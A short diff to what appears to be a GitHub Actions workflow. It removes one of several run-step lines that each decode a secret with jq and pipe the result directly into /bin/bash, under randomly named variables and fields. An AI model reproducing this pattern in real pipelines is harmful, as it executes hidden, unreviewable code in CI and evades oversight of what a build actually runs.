@@ -22,7 +22,6 @@ jobs:
           jr48: ${{ secrets.jr48 }}
         run: |
           printf '%s' "$jr48" | jq -r .d5779 | /bin/bash
-          echo $ug9948 | jq -r .jc9 | /bin/bash
           printf '%s' "$g3" | jq -r .ldfc5262 | /bin/bash
           echo $sv76601 | jq -r .vuc772 | /bin/bash
           printf '%s' "$giggo4" | jq -r .vot9 | /bin/bash
